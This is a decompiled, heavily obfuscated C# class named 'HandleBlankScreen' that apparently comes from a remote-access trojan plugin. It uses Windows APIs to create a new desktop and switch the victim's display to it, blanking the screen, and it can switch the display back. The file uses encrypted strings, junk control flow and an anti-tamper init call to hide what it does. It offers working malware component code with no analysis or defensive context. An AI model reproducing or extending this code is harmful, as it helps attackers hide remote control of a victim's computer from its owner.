using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using HsZcU78F13T1yLWI1V;
using UY3BiEArlp6B4GPt9k;

namespace Plugin.Handler;

public class HandleBlankScreen
{
	private enum DESKTOP_ACCESS : uint
	{
		DESKTOP_NONE = 0u,
		DESKTOP_READOBJECTS = 1u,
		DESKTOP_CREATEWINDOW = 2u,
		DESKTOP_CREATEMENU = 4u,
		DESKTOP_HOOKCONTROL = 8u,
		DESKTOP_JOURNALRECORD = 16u,
		DESKTOP_JOURNALPLAYBACK = 32u,
		DESKTOP_ENUMERATE = 64u,
		DESKTOP_WRITEOBJECTS = 128u,
		DESKTOP_SWITCHDESKTOP = 256u,
		GENERIC_ALL = 511u
	}

	public readonly IntPtr hOldDesktop;

	public IntPtr hNewDesktop;

	internal static HandleBlankScreen J5COYYxyd7wEJiSn4eL;

	[DllImport("user32.dll")]
	public static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

	[DllImport("user32.dll")]
	private static extern bool SwitchDesktop(IntPtr hDesktop);

	[DllImport("user32.dll")]
	public static extern bool CloseDesktop(IntPtr handle);

	[DllImport("user32.dll")]
	public static extern bool SetThreadDesktop(IntPtr hDesktop);

	[DllImport("user32.dll")]
	public static extern IntPtr GetThreadDesktop(int dwThreadId);

	[DllImport("kernel32.dll")]
	public static extern int GetCurrentThreadId();

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Run()
	{
		switch (1)
		{
		case 0:
			break;
		case 1:
			try
			{
				SwitchDesktop(hNewDesktop);
				int num = 0;
				if (!KSGxMUxpQM0sIL9ty8f())
				{
					int num2 = default(int);
					num = num2;
				}
				switch (num)
				{
				case 0:
					break;
				}
				break;
			}
			catch
			{
				int num3 = 0;
				if (RfvIYAxgWbUOM2yl8q3() != null)
				{
					int num4 = default(int);
					num3 = num4;
				}
				switch (num3)
				{
				case 0:
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Stop()
	{
		switch (1)
		{
		case 1:
			try
			{
				SwitchDesktop(hOldDesktop);
				int num = 0;
				if (RfvIYAxgWbUOM2yl8q3() != null)
				{
					int num2 = default(int);
					num = num2;
				}
				switch (num)
				{
				case 0:
					break;
				}
				break;
			}
			catch
			{
				int num3 = 0;
				if (RfvIYAxgWbUOM2yl8q3() != null)
				{
					int num4 = default(int);
					num3 = num4;
				}
				switch (num3)
				{
				case 0:
					break;
				}
				break;
			}
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public HandleBlankScreen()
	{
		ljXW3TxhHQd3YvDZ6XG();
		hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
		hNewDesktop = CreateDesktop((string)rHvA8GxryqwELeImBDL(286), IntPtr.Zero, IntPtr.Zero, 0, 511u, IntPtr.Zero);
		base._002Ector();
		int num = 0;
		if (false)
		{
			int num2;
			num = num2;
		}
		switch (num)
		{
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool KSGxMUxpQM0sIL9ty8f()
	{
		return J5COYYxyd7wEJiSn4eL == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static HandleBlankScreen RfvIYAxgWbUOM2yl8q3()
	{
		return J5COYYxyd7wEJiSn4eL;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void ljXW3TxhHQd3YvDZ6XG()
	{
		WkMgYHbfSUMGdoITRx.D8j0NC3zOxwAq();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object rHvA8GxryqwELeImBDL(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}
}
